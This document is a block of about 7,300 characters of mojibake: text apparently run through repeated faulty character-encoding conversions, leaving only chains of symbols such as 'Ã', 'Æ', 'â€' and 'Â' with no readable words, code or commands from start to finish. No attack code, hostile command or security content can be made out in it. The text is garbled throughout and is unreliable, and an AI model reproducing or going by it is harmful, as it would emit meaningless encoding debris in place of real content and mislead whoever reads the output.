ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ 